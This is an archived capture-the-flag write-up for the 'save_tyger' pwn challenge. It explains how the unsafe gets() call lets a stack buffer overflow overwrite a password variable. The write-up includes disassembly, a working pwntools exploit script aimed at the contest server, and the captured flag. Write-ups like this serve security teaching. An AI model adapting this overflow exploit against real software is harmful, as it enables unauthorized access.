# save_tyger

**CTF:** LexingtonInformaticsTournament 2022  
**Category:** pwn  
**Original writeup:** <https://ctftime.org/writeup/34652> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

First, download the ZIP archive and unzip it. Inside you'll find the source code of `save_tyger` in `save_tyger.c`, and the `save_tyger` executable. If we look at the source code, we see that it uses `gets`, which is known to be unsafe because it reads and writes past the length of a buffer, which can cause buffer overflows.

Now we see that it's writing into the `buf` buffer. We also see that it checks and gives us the flag only if `pass` is equal to `0xabadaaab`. We need to overwrite `pass` with a buffer overflow, and we have the flag.

Now let's disassemble `save_tyger` with `objdump -Mintel -D ./save_tyger` and look at what it looks like when compiled:

```assembly

...

00000000000011c9 <main>:

11c9: f3 0f 1e fa endbr64

11cd: 55 push rbp

11ce: 48 89 e5 mov rbp,rsp

11d1: 48 83 ec 30 sub rsp,0x30

11d5: 48 c7 45 f8 00 00 00 mov QWORD PTR [rbp-0x8],0x0

11dc: 00

11dd: 48 8d 3d 24 0e 00 00 lea rdi,[rip+0xe24] # 2008 <_IO_stdin_used+0x8>

11e4: e8 a7 fe ff ff call 1090 <puts@plt>

11e9: 48 8d 3d 4b 0e 00 00 lea rdi,[rip+0xe4b] # 203b <_IO_stdin_used+0x3b>

11f0: e8 9b fe ff ff call 1090 <puts@plt>

11f5: 48 8d 45 d0 lea rax,[rbp-0x30]

11f9: 48 89 c7 mov rdi,rax

11fc: b8 00 00 00 00 mov eax,0x0

1201: e8 aa fe ff ff call 10b0 <gets@plt>

1206: b8 ab aa ad ab mov eax,0xabadaaab

120b: 48 39 45 f8 cmp QWORD PTR [rbp-0x8],rax

120f: 75 66 jne 1277 <main+0xae>

1211: 48 8d 3d 3f 0e 00 00 lea rdi,[rip+0xe3f] # 2057 <_IO_stdin_used+0x57>

1218: e8 73 fe ff ff call 1090 <puts@plt>

121d: 48 8d 35 3e 0e 00 00 lea rsi,[rip+0xe3e] # 2062 <_IO_stdin_used+0x62>

1224: 48 8d 3d 39 0e 00 00 lea rdi,[rip+0xe39] # 2064 <_IO_stdin_used+0x64>

122b: e8 90 fe ff ff call 10c0 <fopen@plt>

1230: 48 89 45 f0 mov QWORD PTR [rbp-0x10],rax

1234: 48 83 7d f0 00 cmp QWORD PTR [rbp-0x10],0x0

1239: 75 16 jne 1251 <main+0x88>

123b: 48 8d 3d 2e 0e 00 00 lea rdi,[rip+0xe2e] # 2070 <_IO_stdin_used+0x70>

1242: e8 49 fe ff ff call 1090 <puts@plt>

1247: bf 01 00 00 00 mov edi,0x1

124c: e8 7f fe ff ff call 10d0 <exit@plt>

1251: 48 8b 45 f0 mov rax,QWORD PTR [rbp-0x10]

1255: 48 89 c2 mov rdx,rax

1258: be 40 00 00 00 mov esi,0x40

125d: 48 8d 3d dc 2d 00 00 lea rdi,[rip+0x2ddc] # 4040 <flag>

1264: e8 37 fe ff ff call 10a0 <fgets@plt>

1269: 48 8d 3d d0 2d 00 00 lea rdi,[rip+0x2dd0] # 4040 <flag>

1270: e8 1b fe ff ff call 1090 <puts@plt>

1275: eb 0c jmp 1283 <main+0xba>

1277: 48 8d 3d 1f 0e 00 00 lea rdi,[rip+0xe1f] # 209d <_IO_stdin_used+0x9d>

127e: e8 0d fe ff ff call 1090 <puts@plt>

1283: b8 00 00 00 00 mov eax,0x0

1288: c9 leave

1289: c3 ret

128a: 66 0f 1f 44 00 00 nop WORD PTR [rax+rax*1+0x0]

...

```

Now let's compare this with the C code. We see that it's setting the memory at `rbp-0x8` to `0x0`, and since this happens with `pass` in the C code, we can assume that `rbp-0x8` is `pass`. Also, we see that `rbp-0x30` is being passed as an argument to `gets`, so we can see that `rbp-0x30` is `buf`.

Now we need some padding with some random character, let's say, `a`, to fill up the space before we get to `pass`, then we need `pass`, with the bytes in little endian order (aka reversed). The amount of padding we need is `0x30-0x8=0x28`, or `40` in decimal.

Also, `pass` in little endian order is `0xab 0xaa 0xad 0xab`. (Note that pwntools, the library we are going to use to write the exploit, can do this for you. I'm showing it here for informational purposes.) We can write a exploit with this information and pwntools (it's a widely used python exploit writing library):

```python3

from pwn import * # importing everything makes exploit writing faster

s = b'a' * 40 # our padding

# pass, in little endian order.

# The p64 function in pwntools does little endian order, and is one of many for different integer types

s += p64(0xabadaaab)

r = remote('litctf.live', 31786) # connect to remote server

r.recvuntil(b'?

') # read input until the question

r.sendline(s) # send our exploit

# pray for flag

print(r.interactive()) # interactive mode that prints out output for us

```

Running this code, we get the following output:

```

[+] Opening connection to litctf.live on port 31786: Done

[*] Switching to interactive mode

It worked!

LITCTF{y4yy_y0u_sav3d_0ur_m41n_or94n1z3r}

[*] Got EOF while reading in interactive

```
